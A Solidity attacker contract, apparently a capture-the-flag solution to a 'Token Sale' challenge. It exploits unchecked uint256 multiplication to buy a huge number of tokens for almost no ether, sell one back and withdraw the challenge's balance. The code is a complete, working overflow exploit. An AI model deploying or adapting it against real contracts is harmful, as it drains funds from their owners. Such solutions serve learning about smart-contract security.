pragma solidity ^0.7.3;

interface IChallenge {
    function isComplete() external view returns (bool);

    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;

}

contract TokenSaleAttacker {
    IChallenge private challenge;
    constructor (address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function attack() external payable {
        uint256 number = (type(uint256).max / (1 ether)) + 1;
        uint256 sendValue = number * (1 ether);
        challenge.buy{value:sendValue}(number);
        challenge.sell(1);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}